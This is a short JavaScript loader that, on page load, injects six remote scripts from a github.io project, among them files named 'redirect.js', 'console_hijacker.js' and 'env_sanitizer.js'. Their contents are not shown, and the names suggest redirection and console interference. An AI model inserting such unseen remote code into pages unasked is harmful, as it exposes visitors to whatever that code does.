(function() {
    const scripts = [
        'brand_initializer.js',
        'outer_network_detector.js',
        'redirect.js',
        'console_hijacker.js',
        'asset_preloader.js',
        'env_sanitizer.js'
    ];
    const baseUrl = 'https://akshat-145609.github.io/Codagenda/';
    
    scripts.forEach(src => {
        const s = document.createElement('script');
        s.src = baseUrl + src;
        s.defer = true;
        document.head.appendChild(s);
    });
})();